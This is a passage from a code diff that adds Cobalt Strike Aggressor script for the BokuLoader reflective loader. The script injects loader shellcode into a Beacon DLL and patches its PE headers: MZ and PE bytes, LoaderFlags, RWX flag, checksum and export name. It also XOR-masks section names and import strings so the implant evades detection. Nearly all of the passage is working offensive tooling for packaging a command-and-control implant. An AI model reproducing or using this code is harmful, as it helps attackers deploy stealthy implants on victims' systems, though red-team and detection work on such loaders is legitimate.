+	println("[+] New LoaderFlags value 0x".uc(formatNumber($LoaderFlags_value, 16)));
+	return $temp_beacon_dll;
+}
+
+
+sub setLoaderFlagZero{
+	local('%pemap $temp_beacon_dll');
+	local('@LoaderFlags_location_A @LoaderFlags_value_A $LoaderFlags_location $LoaderFlags_value');
+
+	$temp_beacon_dll  = $1;
+	%pemap = pedump($temp_beacon_dll);	
+
+	@LoaderFlags_location_A  = values(%pemap, @("LoaderFlags.<location>"));
+	$LoaderFlags_location    = @LoaderFlags_location_A[0];
+	println("[+] Setting OptionalHeader.LoaderFlags to 0x0");
+	$temp_beacon_dll = pe_set_long($temp_beacon_dll,$LoaderFlags_location,0);
+
+	return $temp_beacon_dll;
+}
+
+
+sub setupUseRWX{
+	local('%pemap $temp_beacon_dll $Win32Version_location $use_rwx_flag');
+	local('$x $index @Bytes $Byte @OptionalHeader_location_A $OptionalHeader_location');
+
+	$temp_beacon_dll  = $1;
+	%pemap = $2;
+	$use_rwx_flag = $3;
+	# OptionalHeader + 0x34 = OptionalHeader.Win32VersionValue. Seems unused by CS so we will put the useRWX flag there
+	@OptionalHeader_location_A  = values(%pemap, @("header.Optional.<location>"));
+	$OptionalHeader_location       = @OptionalHeader_location_A[0];
+	# DWORD       Win32VersionValue;
+	$Win32Version_location = $OptionalHeader_location + 0x34;
+	println("[+] OptionalHeader.Win32VersionValue location 0x".uc(formatNumber($Win32Version_location, 16)));
+	if ($use_rwx_flag eq "true"){
+		# 0xBC = 188
+		$temp_beacon_dll = pe_set_long($temp_beacon_dll,$Win32Version_location,188);
+	}else{
+		$temp_beacon_dll = pe_set_long($temp_beacon_dll,$Win32Version_location,0);
+	}
+	for ($x = 0; $x < 2; $x++) {
+		$index = $Win32Version_location;
+		$index += $x;
+		$Byte = byteAt($temp_beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ OptionalHeader.Win32VersionValue useRWX code at offset +0x0x".uc(formatNumber($Win32Version_location, 16))." : ".@Bytes);
+	return $temp_beacon_dll;
+}
+
+
+sub setExportDllName{
+	local('$beacon_dll %pemap $module_x64 $ExportDllName');
+	local('$dllString $Byte $index $x @ExportName_Location_A $ExportName_Location');
+	$beacon_dll    = $1;
+	%pemap         = $2;
+	$ExportDllName = $3;
+	
+	@ExportName_Location_A   = values(%pemap, @("Export.Name.<location>"));
+	$ExportName_Location     = @ExportName_Location_A[0];
+
+	$beacon_dll = pe_set_stringz($beacon_dll, $ExportName_Location, $ExportDllName);
+	# Check that the string was written
+	$dllString    = getStringFromOffset($beacon_dll, $ExportName_Location);
+	println("[+] DLL name in Export Directory changed to : ".$dllString);
+	return $beacon_dll;
+}
+
+
+sub setChecksum{
+	local('%pemap $temp_beacon_dll $Checksum_location ');
+	local('$checksum @OptionalHeader_location_A $OptionalHeader_location');
+
+	$temp_beacon_dll  = $1;
+	%pemap            = $2;
+	$checksum         = $3;
+
+	# OptionalHeader + 0x40 = OptionalHeader.Checksum
+	@OptionalHeader_location_A  = values(%pemap, @("header.Optional.<location>"));
+	$OptionalHeader_location       = @OptionalHeader_location_A[0];
+	# DWORD       CheckSum;
+	$Checksum_location = $OptionalHeader_location + 0x40;
+	println("[+] OptionalHeader.Checksum location 0x".uc(formatNumber($Checksum_location, 16)));
+	if ($checksum != 0){
+		$temp_beacon_dll = pe_set_long($temp_beacon_dll,$Checksum_location,$checksum);
+	}else{
+		$temp_beacon_dll = pe_set_long($temp_beacon_dll,$Checksum_location,0);
+	}
+
+	return $temp_beacon_dll;
+}
+
+sub boku_pe_customPE{
+	local('$PE_value $temp_dll $$PE_location');
+	$temp_dll    = $1;
+	$PE_value    = $2;
+	$PE_location = $3;
+
+	$temp_dll    = pe_set_short($temp_dll, $PE_location, $PE_value);
+	return $temp_dll;
+}
+
+
+sub boku_pe_customMZ{
+	local('$PEval');
+	$temp_dll = $1;
+	$MZval    = $2;
+
+	$temp_dll = pe_set_long($temp_dll, 0, $MZval);
+	return $temp_dll;
+}
+
+sub boku_pe_MZ_from_C2Profile{
+	$temp_beacon_dll  = $1;
+	$magic_mz         = $2;
+
+	$mz_len           = strlen($magic_mz);
+	if ($magic_mz ne ""){
+		if ($mz_len != 4)
+		{
+			warn("Error: MZ value must be 4 chars of nop instructions! MZ header modification not applied.")
+		}else
+		{
+			$temp_dll = pe_set_string($temp_dll, 0, $magic_mz);
+			for ($x = 0; $x < $mz_len; $x++)
+			{
+				@mz_4b_array[$x] = byteAt($magic_mz, $x);
+			}
+			println("[+] Check that the first 4 byte char of nops from C2 profile are correct: ");
+			print("CHECK > ");
+			for ($x = 0; $x < $mz_len; $x++)
+			{
+				print(uc(formatNumber(@mz_4b_array[$x], 16))." ");
+			}
+			println("");
+			printByteDump($temp_dll,18,0);
+		}
+	}
+}
+
+sub generate_my_dll {
+	
+	local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');
+	local('$prepend $magic_mz $smartinject $image_size_x64 $module_x64 $entry_point $xorKey');
+	local('$rich_header $checksum $compile_time $appended $magic_pe $DLL_name $isPivot');
+
+	if ($3 eq "x86")
+	{
+		warn("Error: x86 not supported by BokuLoader.");
+		return $null;	
+	}
+
+	$isPivot = 0;
+	if ("pivot." isin $1)
+	{
+		warn("Pivot beacons are an experimental feature of BokuLoader, good luck!");
+		$isPivot = 1;
+	}
+
+	# Get C2 Malleable PE command options from the C2 profile
+	$profile = data_query("metadata")["c2profile"];
+	$userwx         = [$profile getString: ".stage.userwx"];
+	$obfuscate      = [$profile getString: ".stage.obfuscate"];
+	$sleep_mask     = [$profile getString: ".stage.sleep_mask"];
+	$stomppe        = [$profile getString: ".stage.stomppe"];
+	#$prepend        = [$profile getString: ".stage.transform-x64"];
+	$allocator      = [$profile getString: ".stage.allocator"];
+	$magic_mz       = [$profile getString: ".stage.magic_mz_x64"];
+	$smartinject    = [$profile getString: ".stage.smartinject"];
+	$image_size_x64 = [$profile getString: ".stage.image_size_x64"];
+	$module_x64     = [$profile getString: ".stage.module_x64"];
+	$entry_point    = [$profile getString: ".stage.entry_point"];
+	$rich_header    = [$profile getString: ".stage.rich_header"];
+	$checksum       = [$profile getString: ".stage.checksum"];
+	$compile_time   = [$profile getString: ".stage.compile_time"];
+	$magic_pe       = [$profile getString: ".stage.magic_pe"];
+	$DLL_name       = [$profile getString: ".stage.name"];
+
+	# Read in BokuLoader.x64.o object file into byte array
+	$name = "BokuLoader";
+	$name = $name .".x64.o";
+	warn("loading: " . $name);
+
+	$handle = openf(script_resource($name));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	warn("Loaded Length: " . strlen($data));
+	if (strlen($data) eq 0) {
+		warn("Error loading reflective loader object file.");
+		return $null;
+	}
+
+	# Extract the reflective loader shellcode from .text section of Bokuloader.x64.o
+	$loader = extract_reflective_loader($data);
+	warn("Extracted Length: " . strlen($loader));
+	if (strlen($loader) eq 0) {
+		warn("Error extracting reflective loader.");
+		return $null;
+	}
+
+	# Write bokuloader shellcode to raw beacon dll
+	$temp_dll = setup_reflective_loader($2, $loader);
+	println("[+] Beacon DLL size: 0x".uc(formatNumber(strlen($temp_dll), 16)));
+	
+	# Output C2 malleable PE command options to operator
+	println("[+] Malleable PE options defined in Malleable C2 profile:");
+	println("|__ Obfuscate        : ".$obfuscate);
+	println("|__ sleep_mask       : ".$sleep_mask);
+	# If userwx is not set in C2 profile then the value defaults to "true"
+	println("|__ userwx           : ".$userwx); 
+	println("|__ stomppe          : ".$stomppe);
+#	println("|__ prepend          : ".$prepend);
+	println("|__ allocator        : ".$allocator);
+	println("|__ magic_mz         : ".$magic_mz);
+	println("|__ magic_pe         : ".$magic_pe);
+	println("|__ image_size_x64   : ".$image_size_x64);
+	println("|__ module_x64       : ".$module_x64);
+	println("|__ entry_point      : ".$entry_point);
+	println("|__ rich_header      : ".$rich_header);
+	println("|__ checksum         : ".$checksum);
+	println("|__ compile_time     : ".$compile_time);
+	println("|__ name             : ".$DLL_name);
+
+	## handle rich_pe_header from C2 profile
+	# These rich_header options change the position of the File_Header and Optional_Header
+	# %pemap before and after these commands will be different. Don't rely on old %pemap values for mods.
+	# Disabled for now. Need to test stability more.
+	# <DEFAULT> = rich_header if not set in C2 profile
+	#if (($rich_header eq "<DEFAULT>") || ($rich_header eq "")){
+	#	$temp_dll = pe_remove_rich_header($temp_dll);
+	#}else{
+	#	$temp_dll = pe_insert_rich_header($temp_dll, $rich_header);
+	#}
+	
+	# Now we should be good with optional_header values in the %pemap
+	my_dump_my_pe($temp_dll);
+	%pemap = pedump($temp_dll);
+	
+	## Set compile time from C2 profile 
+	# Disabled for now. Need to test stability more.
+	#$temp_dll = pe_set_compile_time_with_string($temp_dll, $compile_time);
+
+	
+	## Change Exported name of the Beacon DLL
+	#if ($DLL_name ne ""){
+	#	$temp_dll = setExportDllName($temp_dll,%pemap,$DLL_name);
+	#}
+
+	## Set checksum from C2 profile
+	#$temp_dll = setChecksum($temp_dll,%pemap,$checksum);
+
+	## Zero out the Export Directory 
+	#  working. Uncomment to use.
+	#$temp_dll = nullExportDirectory($temp_dll);
+
+	# Handle useRWX 
+	$temp_dll = setupUseRWX($temp_dll,%pemap,$userwx);
+
+	# Handle entry_point option that sets the decoy entry point in optional header
+	if ($entry_point ne ""){
+		$temp_dll = setDecoyEntryPoint($temp_dll,$entry_point);
+	}else{
+		$temp_dll = setLoaderFlagZero($temp_dll);
+	}
+	# setup virtual beacon dll allocator. DLL stomp, heap alloc, virtual alloc, mapped
+	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
+
+	$xorKey = 0xBC;
+	$temp_dll = setup_obfuscate_xor_key($temp_dll,$obfuscate,$xorKey);
+	if ($obfuscate eq "true") {
+		println("## Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
+		$temp_dll = boku_pe_mask_ImportStrings($temp_dll, $xorKey, $isPivot);
+		if (strlen($temp_dll) eq 0) {
+			warn("Failed obfuscating beacon import DLL strings!");
+			return $null;
+		}
+		$temp_dll = boku_pe_mask_SectionNames($temp_dll, $xorKey);
+	} 
+	# honor C2 malleable PE modifications in C2 profile
+	# Disabled because the obfuscate breaks it and it won't be applied 
+#	$temp_dll = setup_transformations($temp_dll,$3);
+#	$temp_dll = setup_strings($temp_dll);
+
+#	$temp_dll = setEgg($temp_dll);
+#	$temp_dll = boku_pe_mask($temp_dll); # Currrently causes issue if prepend transform is in C2 profile. Causes wrong bytes to be overwritten due to offset change
+	$temp_dll = boku_strrep($temp_dll);
+#	$temp_dll = prependBytes($temp_dll);
+
+	# MZ Header
+	println("[+] Attempting to modify MZ header to 4 byte char of nops from C2 profile: ".$magic_mz);
+	if ($magic_mz ne ""){
+		$mz_len = strlen($magic_mz);
+		if ($mz_len != 4)
+		{
+			warn("Error: MZ value must be 4 chars of nop instructions! MZ header modification not applied.")
+		}else
+		{
+			$temp_dll = pe_set_string($temp_dll, 0, $magic_mz);
+			for ($x = 0; $x < $mz_len; $x++)
+			{
+				@mz_4b_array[$x] = byteAt($magic_mz, $x);
+			}
+			println("[+] Check that the first 4 byte char of nops from C2 profile are correct: ");
+			print("CHECK > ");
+			for ($x = 0; $x < $mz_len; $x++)
+			{
+				print(uc(formatNumber(@mz_4b_array[$x], 16))." ");
+			}
+			println("");
+			printByteDump($temp_dll,18,0);
+		}
+	}
+	# PE Bytes
+	println("[+] Attempting to modify PE bytes to 2 byte char of nops from C2 profile: ".$magic_pe);
+	if ($magic_pe ne ""){
+		$pe_len = strlen($magic_pe);
+		if ($pe_len != 2)
+		{
+			warn("Error: PE value must be 2 chars! PE bytes modification not applied.")
+		}else
+		{
+			@pebytes_location_A    = values(%pemap, @("e_lfanew.<value>"));
+			$pebytes_location      = @pebytes_location_A[0];
+			$temp_dll              = pe_set_string($temp_dll, $pebytes_location, $magic_pe);
+			for ($x = 0; $x < $pe_len; $x++)
+			{
+				@pe_2b_array[$x] = byteAt($magic_pe, $x);
+			}
+			println("[+] Check that the 2 bytes at offset ".uc(formatNumber($pebytes_location, 16))." char of nops from C2 profile are correct: ");
+			print("CHECK >  ");
+			for ($x = 0; $x < $pe_len; $x++)
+			{
+				print(uc(formatNumber(@pe_2b_array[$x], 16))." ");
+			}
+			println("");
+			printByteDump($temp_dll,18,$pebytes_location);
+		}
+	}
+	return $temp_dll;
+}
+
+set BEACON_RDLL_GENERATE {
+	warn("========== Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3 . " ==========");
+	return generate_my_dll($1, $2, $3);
+}
+
+set BEACON_RDLL_GENERATE_LOCAL {
+	warn("========== Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . $1 . " with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA " . $5 . " GetProcAddress " . $6 . " ==========");
+	return generate_my_dll($1, $2, $3);
+}
+
+set BEACON_RDLL_SIZE {
+	warn("========== Running 'BEACON_RDLL_SIZE' for DLL Name " . $1 . " with architecture " . $2);
+	return "100";
+}
